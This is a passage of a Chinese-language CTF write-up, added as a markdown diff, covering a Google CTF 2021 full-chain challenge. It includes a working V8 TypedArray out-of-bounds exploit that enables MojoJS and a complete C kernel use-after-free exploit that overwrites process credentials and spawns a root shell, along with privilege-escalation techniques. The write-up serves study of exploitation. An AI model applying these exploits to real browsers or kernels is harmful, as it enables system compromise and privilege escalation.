@@ -884,3 +884,589 @@ bpf_lookup_elem(int fd, const void *key, void *value)
 }
 ```
 
+
+
+### Full chain
+
+
+
+這題涵蓋了三個不同服務的攻擊：browser exploit (V8) + sandbox escape (mojo) + kernel exploit，並且 patch 皆是一眼能夠看出漏洞的程度，是一個想接觸 browser exploit 與 kernel exploit 很好的進入點。
+
+P.S. 我對 browser / kernel 相關的 exploit 還不是很熟，因此該題皆參考他人的 writeup + 測試來完成。
+
+
+
+**Part.1 V8**
+
+對 V8 的 patch 如下：
+
+```diff
+diff --git a/src/builtins/typed-array-set.tq b/src/builtins/typed-array-set.tq
+index b5c9dcb261..ac5ebe9913 100644
+--- a/src/builtins/typed-array-set.tq
++++ b/src/builtins/typed-array-set.tq
+@@ -198,7 +198,7 @@ TypedArrayPrototypeSetTypedArray(implicit context: Context, receiver: JSAny)(
+   if (targetOffsetOverflowed) goto IfOffsetOutOfBounds;
+
+   // 9. Let targetLength be target.[[ArrayLength]].
+-  const targetLength = target.length;
++  // const targetLength = target.length;
+
+   // 19. Let srcLength be typedArray.[[ArrayLength]].
+   const srcLength: uintptr = typedArray.length;
+@@ -207,8 +207,8 @@ TypedArrayPrototypeSetTypedArray(implicit context: Context, receiver: JSAny)(
+
+   // 21. If srcLength + targetOffset > targetLength, throw a RangeError
+   //   exception.
+-  CheckIntegerIndexAdditionOverflow(srcLength, targetOffset, targetLength)
+-      otherwise IfOffsetOutOfBounds;
++  // CheckIntegerIndexAdditionOverflow(srcLength, targetOffset, targetLength)
++  //     otherwise IfOffsetOutOfBounds;
+
+   // 12. Let targetName be the String value of target.[[TypedArrayName]].
+   // 13. Let targetType be the Element Type value in Table 62 for
+```
+
+在使用 TypedArray 的 built-in function `.set()` 時，並不會對 index 做 bound 檢查，因此能做到將資料蓋寫到後面的資料，構造 primitive `addrof`、`fakeobj` 的方式是透過 oob 蓋掉某個 JSObject 的 length，藉此讀取與蓋寫後續的 JSObject ，而 `aar64` 與 `aaw64` 是透過蓋寫 TypedArray 的 data_ptr。最後透過建立 div html element，並讀取其 member 取得 HTMLDivElement 的位址，透過減去 offset 得到 code base，而後加上 `mojo_js_enabled` 的 offset，蓋寫成 1 來開啟 mojoJS，才能在第二階段攻擊 Mojo，exploit 如下：
+
+```js
+let x = new Uint32Array(1);
+let y = new Uint32Array(1);
+let oob = [1.1];
+let evil = [{}];
+let victim_obj = new BigUint64Array(1);
+x.set([0x2222], 0);
+// you dont need to overwrite length in element
+// y.set(x, 20);
+y.set(x, 26);
+
+let buf = new ArrayBuffer(8);
+let u32 = new Uint32Array(buf);
+let u64 = new BigUint64Array(buf);
+let f64 = new Float64Array(buf);
+
+function addrof(obj) {
+    evil[0] = obj;
+    f64[0] = oob[4];
+    return BigInt(u32[0] - 1);
+}
+
+function fakeobj(addr) {
+    oob[4] = addr;
+    return evil[0];
+}
+
+// leak high heap address from typed array
+// external_pointer (obj + 0x28)
+f64[0] = oob[25];
+let high_heap = BigInt(u32[1]) << 32n;
+console.log("[+] heap high address: ", high_heap.toString(16));
+
+// the typed array data_ptr is
+// base_pointer(obj+0x30, 4 bytes) + external_pointer(obj+0x28, 8 bytes)
+// so we can overwrite externel + base_pointer
+// to achieve aar and aaw
+function i642f(val) {
+    u64[0] = val;
+    return f64[0];
+}
+
+function f2i64(val) {
+    f64[0] = val;
+    return u64[0];
+}
+
+function aar64(addr) {
+    backup_high = oob[25];
+    backup_low = oob[26];
+    save = f2i64(oob[26]) & 0xffffffff00000000n;
+    oob[25] = i642f((addr & 0xffffffff00000000n) | 7n); // high
+    oob[26] = i642f(save + (((addr - 8n) | 1n) & 0xffffffffn)); // low
+    ret = victim_obj[0];
+    oob[25] = backup_high;
+    oob[26] = backup_low;
+    return ret;
+}
+
+function aaw64(addr, val) {
+    backup_high = oob[25];
+    backup_low = oob[26];
+    save = f2i64(oob[26]) & 0xffffffff00000000n;
+    oob[25] = i642f((addr & 0xffffffff00000000n) | 7n); // high
+    oob[26] = i642f(save + (((addr - 8n) | 1n) & 0xffffffffn)); // low
+    victim_obj[0] = val;
+    oob[25] = backup_high;
+    oob[26] = backup_low;
+}
+
+let div = document.createElement('div');
+let div_addr = high_heap | addrof(div);
+console.log(`[+] div address: 0x${div_addr.toString(16)}`);
+
+let addr_HTMLDivElement = aar64(div_addr + 0xcn);
+console.log(`[+] HTMLDivElement: 0x${addr_HTMLDivElement.toString(16)}`);
+
+let code_base = addr_HTMLDivElement - 0xc1bb7c0n;
+console.log(`[+] codebase: 0x${code_base.toString(16)}`);
+
+let mojo_js_enabled_addr = code_base + 0xc560f0en;
+console.log(`[+] mojo_js_enabled: 0x${mojo_js_enabled_addr.toString(16)}`);
+
+aaw64(mojo_js_enabled_addr, 0x1n);
+
+%SystemBreak();
+```
+
+在測試環境中可以用 `%SystemBreak()` 下斷點，以下為 debug 時使用的 gdb script。不過麻煩的是，透過測試發現只能用 **xterm** 來 attach 上 render process，**tmux** 與 **gnome-terminal** 都不能用：
+
+```bash
+set follow-fork-mode parent
+r --no-sandbox --headless --js-flags='--allow-natives-syntax' --renderer-cmd-prefix='xterm -geometry 100x50+10+10 -e gdb --args' --disable-gpu --user-data-dir=./userdata v8_exploit.html
+```
+
+不過因為 **xterm** 預設使用的 copy / paste 很難用，因此透過以下 command 可以讓我們使用 `shift` + `ctrl` + `c/v` 做到 copy / paste：
+
+```bash
+cat > ~/.Xresources
+XTerm*vt100.translations: #override \
+    Shift Ctrl <Key> C: copy-selection(CLIPBOARD) \n\
+    Shift Ctrl <Key> V: insert-selection(CLIPBOARD)
+
+xrdb -merge ~/.Xresources
+```
+
+`nm` 可以看 demangle 後的 C++ symbol，也能用來找 symbol 的 offset：
+
+```bash
+nm --demangle ./chrome | grep -i 'is_mojo_js_enabled'
+# --demangle: make C++ function more readable
+```
+
+
+
+**Part2. Sbx**
+
+
+
+執行 **chromium** 需要跑的參數：
+
+```python
+import subprocess
+import tempfile
+import sys
+import shutil
+import os
+import base64
+
+os.symlink('/usr/lib/chromium/mojo_bindings', '/tmp/exploit/mojo')
+
+subprocess.check_call(['/usr/lib/chromium/chrome', '--headless', '--disable-gpu',
+                       '--remote-debugging-port=9222', '--user-data-dir=/tmp/userdata',
+                       '--enable-logging=stderr', 'exploit.html'], cwd='/tmp/exploit')
+```
+
+由於我想在 local 環境測試，因此直接執行：
+
+```bash
+# gdb script
+r --no-sandbox --headless --js-flags='--allow-natives-syntax' --renderer-cmd-prefix='xterm -geometry 100x50+10+10 -e gdb --args' --disable-gpu --user-data-dir=./userdata v8_exploit.html
+
+# command
+./chrome -no-sandbox --headless --disable-gpu --enable-logging=stderr --user-data-dir=./userdata v8_exploit.html
+```
+
+然而在 ubuntu 20.04 的 local 測試都跑不過 sbx escape 的 payload，原因不明，只能先擱置在旁。
+
+
+
+**Part3. kernel exploit**
+
+kernel module 名稱為 `ctf.ko`，source code 大致如下：
+
+```c
+struct ctf_data {
+  char *mem;
+  size_t size;
+};
+// ...
+
+static const struct file_operations ctf_fops = {
+  .owner = THIS_MODULE,
+  .open = ctf_open,
+  .release = ctf_release,
+  .read = ctf_read,
+  .write = ctf_write,
+  .unlocked_ioctl = ctf_ioctl,
+};
+
+// ...
+
+static ssize_t ctf_ioctl(struct file *f, unsigned int cmd, unsigned long arg)
+{
+  struct ctf_data *data = f->private_data;
+  char *mem;
+
+  switch(cmd) {
+  case 1337:
+    if (arg > 2000) {
+      return -EINVAL;
+    }
+
+    mem = kmalloc(arg, GFP_KERNEL);
+    if (mem == NULL) {
+      return -ENOMEM;
+    }
+
+    data->mem = mem;
+    data->size = arg;
+    break;
+
+  case 1338:
+    kfree(data->mem);
+    break;
+
+  default:
+    return -ENOTTY;
+  }
+
+  return 0;
+}
+```
+
+我們可以透過該 kernel module 建立一塊 memory 空間並做讀寫、重新申請與釋放，然而漏洞在於釋放後並沒有清除 `data->mem`，仍可以透過 `read`、`write` 對 freed memory 做讀寫。
+
+因為可以存取 freed memory，因此 leak 十分容易，而問題是該如何透過 UAF 做 exploit。方法應該有許多種：
+
+1. overwrite **/sbin/modprobe**
+2. `commit_creds(prepare_kernel_cred(NULL))`
+3. overwrite EUID of `cred` structure of the own process
+
+我選擇的是控制 **tty_struct** 配合 **overwrite EUID of `cred` structure of the own process** 來提權，主要是這兩個方法我都不太熟。
+
+
+
+由於 `sizeof(struct tty_struct) == 0x2b8`，一開始先建立 `0x2b8` 大小的 chunk 並馬上 free 掉，之後在 spray `struct tty_struct` 時很有可能會拿到我們 free 掉的 chunk，而 `struct tty_struct` 的結構如下：
+
+```c
+// https://elixir.bootlin.com/linux/latest/source/include/linux/tty.h#L143
+struct tty_struct {
+	int	magic;
+	struct kref kref;
+	struct device *dev;	/* class device or NULL (e.g. ptys, serdev) */
+	struct tty_driver *driver;
+	const struct tty_operations *ops;
+	int index;
+	...
+```
+
+其中 `*ops` 會指向一個 `struct tty_operations` function table：
+
+```c
+// https://elixir.bootlin.com/linux/latest/source/include/linux/tty_driver.h#L247
+struct tty_operations {
+	struct tty_struct * (*lookup)(struct tty_driver *driver,
+			struct file *filp, int idx);
+	int  (*install)(struct tty_driver *driver, struct tty_struct *tty);
+	void (*remove)(struct tty_driver *driver, struct tty_struct *tty);
+	int  (*open)(struct tty_struct * tty, struct file * filp);
+	void (*close)(struct tty_struct * tty, struct file * filp);
+	void (*shutdown)(struct tty_struct *tty);
+	void (*cleanup)(struct tty_struct *tty);
+	int  (*write)(struct tty_struct * tty,
+		      const unsigned char *buf, int count);
+	...
+```
+
+因為參數傳遞的關係，我們可以控制 **rsi** 與 **rdx**，而如果我們將使用 function table 蓋掉，讓 function table 指向我們能控制的位置，使得如 `ioctl` 等使用到 **rdi** 與 **rdx** 的 function 會執行如以下 gadget：
+
+```asm
+; aar
+mov rax, [rdx];
+ret;
+
+; aaw
+mov [rdx], ecx;
+ret;
+```
+
+就能做到任意寫與任意讀。不過因為不知道 spray 到的是哪一個 tty，因此所有 spray 的 tty 都需要執行一次，才會跑到我們能控制 `tty_struct` 對應到的 tty，並蓋掉 tty 的 function pointer `ops`。
+
+```c
+unsigned long aar32(unsigned long addr)
+{
+    unsigned long val;
+
+    u64_ptr[46] = kernel_base + mov_rax_prdx_ret;
+    write(ctf_fd, chr_ptr, 0x2b8);
+
+    if (target_fd != -1)
+        return ioctl(spray[target_fd], 0, addr);
+
+    for (int i = 0; i < 0x100; i++) {
+        val = ioctl(spray[i], 0, addr);
+        if (val != 0xffffffffffffffff) {
+            target_fd = i;
+            return val;
+        }
+    }
+    return 0;
+}
+
+void aaw32(unsigned long addr, unsigned data)
+{
+    u64_ptr[46] = kernel_base + mov_prdx_esi;
+    write(ctf_fd, chr_ptr, 0x2b8);
+
+    if (target_fd != -1) {
+        ioctl(spray[target_fd], data, addr - 0x10);
+        return;
+    }
+
+    for (int i = 0; i < 0x100; i++)
+        write(spray[i], data, addr - 0x10);
+}
+```
+
+P.S. 嘗試了一下發現 `write` 雖然也能控制 **rsi**、**rdx**，不過猜測在 syscall write 那層會因為 bad address 而被擋下，因此應該只有 `ioctl` 可以被利用。
+
+
+
+之後會需要找當前 process 的 `task_struct`，並改對應的 `cred`，在此是透過任意讀 + `prctl(PR_SET_NAME)` 搜尋整個 heap，找到我們所設置的 process name 來取得 `task_struct` 的位址，而 process name 為 `task_struct` 當中的 `name` member，因此能透過 offset 求得 `cred` 的位址。`cred` 為 pointer，指向描述 process credentials 的結構 `struct cred`：
+
+```c
+// https://elixir.bootlin.com/linux/latest/source/include/linux/cred.h#L110
+struct cred {
+	atomic_t	usage;
+#ifdef CONFIG_DEBUG_CREDENTIALS
+	atomic_t	subscribers;	/* number of processes subscribed */
+	void		*put_addr;
+	unsigned	magic;
+#define CRED_MAGIC	0x43736564
+#define CRED_MAGIC_DEAD	0x44656144
+#endif
+	kuid_t		uid;		/* real UID of the task */
+	kgid_t		gid;		/* real GID of the task */
+	kuid_t		suid;		/* saved UID of the task */
+	kgid_t		sgid;		/* saved GID of the task */
+	kuid_t		euid;		/* effective UID of the task */
+	kgid_t		egid;		/* effective GID of the task */
+	kuid_t		fsuid;		/* UID for VFS ops */
+	kgid_t		fsgid;		/* GID for VFS ops */
+    ...
+```
+
+其中 member Xid 用來描述當前 process 的執行身份。如果我們能夠將這些 value 寫成 0，kernel 就會認為我們當前的執行身份是 root/root，此時 usermode 呼叫 `system("/bin/bash")` 時就會繼承 `cred`，因此擁有 root 的執行權限，做到提權。
+
+
+
+Makefile：
+
+```makefile
+all:
+	musl-gcc -o exp -static ./exp.c
+	strip -s ./exp
+	mount -o loop ./rootfs.img owo
+	cp exp ./owo
+	umount owo
+```
+
+
+
+Exploit：
+
+```c
+#include <stdio.h>
+#include <sys/ioctl.h>
+#include <fcntl.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <sys/prctl.h>
+#define TTY_MAGIC		0x5401
+
+unsigned long mov_rax_prdx_ret = 0x5efab5; // mov rax, qword ptr [rdx] ; ret
+unsigned long mov_prdx_esi = 0x43575b; // mov dword ptr [rdx + 0x10], esi ; ret
+
+int ctf_fd;
+char *chr_ptr;
+unsigned *u32_ptr;
+unsigned long *u64_ptr;
+unsigned long file_operations;
+unsigned long kernel_base;
+unsigned long heap;
+int spray[0x100];
+int target_fd = -1;
+
+void free_ctfdata()
+{
+    ioctl(ctf_fd, 1338);
+}
+
+void new_ctfdata(unsigned long size)
+{
+    ioctl(ctf_fd, 1337, size);
+}
+
+void perr(const char *msg)
+{
+    puts(msg);
+    if (ctf_fd != -1)
+        close(ctf_fd);
+    exit(1);
+}
+
+void show_u64ptr(unsigned long *ptr, size_t size)
+{
+    size_t len = size / 8;
+    for (int i = 0; i < len; i++)
+        printf("[%d\t0x%02x]\t0x%016lx\n", i, i*8, ptr[i]);
+}
+
+unsigned long aar32(unsigned long addr)
+{
+    unsigned long val;
+
+    u64_ptr[46] = kernel_base + mov_rax_prdx_ret;
+    write(ctf_fd, chr_ptr, 0x2b8);
+
+    if (target_fd != -1)
+        return ioctl(spray[target_fd], 0, addr);
+
+    for (int i = 0; i < 0x100; i++) {
+        val = ioctl(spray[i], 0, addr);
+        if (val != 0xffffffffffffffff) {
+            target_fd = i;
+            return val;
+        }
+    }
+    return 0;
+}
+
+void aaw32(unsigned long addr, unsigned data)
+{
+    u64_ptr[46] = kernel_base + mov_prdx_esi;
+    write(ctf_fd, chr_ptr, 0x2b8);
+
+    if (target_fd != -1) {
+        ioctl(spray[target_fd], data, addr - 0x10);
+        return;
+    }
+
+    for (int i = 0; i < 0x100; i++)
+        write(spray[i], data, addr - 0x10);
+}
+
+
+/* 0xffffffff81000000 _stext
+ * 0xffffffffc0000000 ctf.ko
+ * sizeof(struct tty_struct) == 0x2b8
+ */
+int main()
+{
+    chr_ptr = (char *) malloc(0x1000); u32_ptr = (unsigned *) chr_ptr; u64_ptr = (unsigned long *) chr_ptr;
+
+    ctf_fd = open("/dev/ctf", O_RDWR);
+    if (ctf_fd == -1)
+        perr("open /dev/ctf failed");
+
+    new_ctfdata(0x2b8);
+    free_ctfdata();
+
+    for (int i = 0; i < 0x100; i++)
+        spray[i] = open("/dev/ptmx", O_NOCTTY | O_RDONLY);
+
+    // leak kernel addr
+    read(ctf_fd, chr_ptr, 0x2b8);
+    if (u32_ptr[0] == TTY_MAGIC)
+        puts("[+] overlap with tty_struct");
+    else
+        perr("[-] next time :(");
+
+    show_u64ptr(u64_ptr, 0x2b8);
+    file_operations = u64_ptr[3];
+    kernel_base = u64_ptr[3] - 0x10745e0;
+    heap = u64_ptr[7] - 0x38; // bp in kfree can know
+    printf("[+] file_operations: 0x%016lx\n", file_operations);
+    printf("[+] kernel_base: 0x%016lx\n", kernel_base);
+    printf("[+] heap: 0x%016lx\n", heap);
+
+    // we hijack tty_struct.name (char name[64]) to create our fake_ops
+    // ops offset is 3
+    // name offset is 45
+    // iotcl offset is 12 in file_operations
+    u64_ptr[3] = heap + (45-12+1) * 8;
+    write(ctf_fd, chr_ptr, 0x2b8);
+
+    char name[4] = {0};
+    int rand_fd = open("/dev/urandom", O_RDONLY);
+    read(rand_fd, name, 4);
+    close(rand_fd);
+
+    prctl(PR_SET_NAME, name);
+    unsigned long cred_addr = 0;
+    unsigned long task_struct = 0;
+    unsigned long start = heap;
+    unsigned long end = heap + 0x100000000;
+
+    printf("[*] ioctl --> mov_rax_prdx_ret: 0x%016lx\n", kernel_base + mov_rax_prdx_ret);
+    printf("[*] ioctl --> mov_prdx_esi: 0x%016lx\n", kernel_base + mov_prdx_esi);
+    for (unsigned long cur = start; cur < end; cur += 0x8) {
+        if ((cur & 0xffffff) == 0)
+            printf("[*] current: 0x%016lx\n", cur);
+        if (aar32(cur) == *(unsigned *)name) {
+            task_struct = cur - 0xae8;
+            cred_addr = task_struct + 0xad8;
+            printf("[+] found task_struct.comm:\t0x%016lx\n", cur);
+            printf("[+] found task_struct.cred:\t0x%016lx\n", cred_addr);
+            printf("[+] found task_struct:\t0x%016lx\n", task_struct);
+            // overwrite Xid
+            unsigned long upper = aar32(cred_addr+4) & 0xffffffff;
+            unsigned long lower = aar32(cred_addr);
+            printf("upper: 0x%016lx, lower: 0x%016lx\n", upper, lower);
+            cred_addr = (upper << 32) | lower;
+            printf("[+] found cred_addr:\t0x%016lx\n", cred_addr);
+
+            getc(stdin);
+            for (int i = 0; i < 8; i++)
+                aaw32(cred_addr + (i+1)*4, 0);
+            getc(stdin);
+            break;
+        }
+    }
+    
+    if (cred_addr == 0)
+        perr("[-] bad luck"); 
+
+    close(ctf_fd);
+    puts("[+] Good job");
+    system("/bin/bash");
+
+    return 0;
+}
+```
+
+P.S. 因為 kernel heap 的結構我們不太能好好掌控，因此在搜尋當前 process 的 `struct task_struct` 有滿高的機率會失敗，個人認為還是寫 `modprobe_path` 比較穩一點，不過就沒有其他方法這麼有趣。
+
+
+
+如果要在沒有 symbol 的 kernel 找 `/sbin/modprobe` 的位置：
+
+1. 用 [extract-vmlinux](https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux) 從 bzImage extract 出 vmlinux
+2. `strings -n 14 -t x ./vmlinux > output` 得到長度 >= 14 字串的 offset，其中會有 `/sbin/modprobe`
+3. `readelf -a ./vmlinux` 找 `.text` 的 offset
+4. kernel_base + modprobe_offset_in_file - text_offset 即是 `modprobe_path` 的位址
+
+
+
+gdb 當中有以下好用的命令，在做 exploit 時會很有幫助：
+
+```
+ptype struct tty_struct # print struct layout
+ptype /o struct tty_struct # with offset
+```
+
+
+
+**Reference**
+
+- https://ptr-yudai.hatenablog.com/entry/2021/07/26/225308
+- https://balsn.tw/ctf_writeup/20210717-googlectf2021/#fullchain
